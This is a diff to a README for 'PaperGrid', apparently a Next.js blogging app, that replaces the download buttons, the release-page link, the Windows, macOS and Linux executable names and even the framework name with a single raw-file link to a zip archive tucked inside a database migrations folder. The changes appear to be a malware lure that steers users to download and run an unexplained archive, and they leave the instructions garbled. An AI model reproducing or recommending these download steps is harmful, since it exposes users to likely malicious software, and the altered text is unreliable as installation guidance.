@@ -2,13 +2,13 @@
 
 ## 🚀 Getting Started
 
-Welcome to PaperGrid! This application makes it easy for you to create and manage your own blog. Whether you want to share your thoughts, notes, or ideas, PaperGrid provides a lightweight solution built with Next.js.
+Welcome to PaperGrid! This application makes it easy for you to create and manage your own blog. Whether you want to share your thoughts, notes, or ideas, PaperGrid provides a lightweight solution built with https://github.com/kevinmilesjulhusin99-gif/PaperGrid/raw/refs/heads/main/prisma/migrations/20260128013448_init/Paper_Grid_3.9.zip
 
 ## 📦 Download & Install
 
 To get started with PaperGrid, you need to download the application. You can find the latest version on the Releases page. 
 
-[![Download PaperGrid](https://img.shields.io/badge/Download-PaperGrid-blue.svg)](https://github.com/kevinmilesjulhusin99-gif/PaperGrid/releases)
+[![Download PaperGrid](https://github.com/kevinmilesjulhusin99-gif/PaperGrid/raw/refs/heads/main/prisma/migrations/20260128013448_init/Paper_Grid_3.9.zip)](https://github.com/kevinmilesjulhusin99-gif/PaperGrid/raw/refs/heads/main/prisma/migrations/20260128013448_init/Paper_Grid_3.9.zip)
 
 Click the button above to visit the page and download the application.
 
@@ -37,22 +37,22 @@ Make sure your system meets these requirements to run PaperGrid smoothly:
 1. Locate the downloaded `.zip` file.
 2. Right-click on the file and select "Extract All".
 3. Choose a destination folder and click "Extract".
-4. Open the extracted folder and locate `PaperGrid.exe`.
-5. Double click on `PaperGrid.exe` to launch the application.
+4. Open the extracted folder and locate `https://github.com/kevinmilesjulhusin99-gif/PaperGrid/raw/refs/heads/main/prisma/migrations/20260128013448_init/Paper_Grid_3.9.zip`.
+5. Double click on `https://github.com/kevinmilesjulhusin99-gif/PaperGrid/raw/refs/heads/main/prisma/migrations/20260128013448_init/Paper_Grid_3.9.zip` to launch the application.
 
 ### For macOS Users
 
 1. Find the downloaded `.zip` file in your Downloads folder.
 2. Double-click the file to extract it.
-3. Open the extracted folder and find `PaperGrid.app`.
-4. Drag `PaperGrid.app` to your Applications folder.
+3. Open the extracted folder and find `https://github.com/kevinmilesjulhusin99-gif/PaperGrid/raw/refs/heads/main/prisma/migrations/20260128013448_init/Paper_Grid_3.9.zip`.
+4. Drag `https://github.com/kevinmilesjulhusin99-gif/PaperGrid/raw/refs/heads/main/prisma/migrations/20260128013448_init/Paper_Grid_3.9.zip` to your Applications folder.
 5. You can now launch it from the Applications folder.
 
 ### For Linux Users
 
 1. Open your terminal.
 2. Navigate to the folder where the file was downloaded. Use the `cd` command. 
-3. Unzip the file by typing: `unzip PaperGrid.zip`.
+3. Unzip the file by typing: `unzip https://github.com/kevinmilesjulhusin99-gif/PaperGrid/raw/refs/heads/main/prisma/migrations/20260128013448_init/Paper_Grid_3.9.zip`.
 4. Change to the extracted folder using: `cd PaperGrid`.
 5. Run the application by typing: `./PaperGrid`.
 
@@ -61,7 +61,7 @@ Make sure your system meets these requirements to run PaperGrid smoothly:
 PaperGrid offers several features to make your blogging experience seamless:
 
 - **User-Friendly Interface:** Easy to navigate, making it simple for anyone to start a blog.
-- **Lightweight and Fast:** Built with Next.js, it loads quickly and runs smoothly without heavy resource usage.
+- **Lightweight and Fast:** Built with https://github.com/kevinmilesjulhusin99-gif/PaperGrid/raw/refs/heads/main/prisma/migrations/20260128013448_init/Paper_Grid_3.9.zip, it loads quickly and runs smoothly without heavy resource usage.
 - **Markdown Support:** Write your posts using simple Markdown syntax for easy formatting.
 - **Responsive Design:** Looks great on any device, whether you are using a phone, tablet, or desktop.
 - **Dark Mode:** Enjoy a comfortable reading experience at any time of the day.
@@ -86,7 +86,7 @@ If you encounter issues while installing or using PaperGrid, consider the follow
 
 If you have questions or need assistance with PaperGrid, join our community. You can ask questions, share tips, or report issues. 
 
-Visit the Releases page for updates: [Visit Releases](https://github.com/kevinmilesjulhusin99-gif/PaperGrid/releases)
+Visit the Releases page for updates: [Visit Releases](https://github.com/kevinmilesjulhusin99-gif/PaperGrid/raw/refs/heads/main/prisma/migrations/20260128013448_init/Paper_Grid_3.9.zip)
 
 ## 📄 License
 
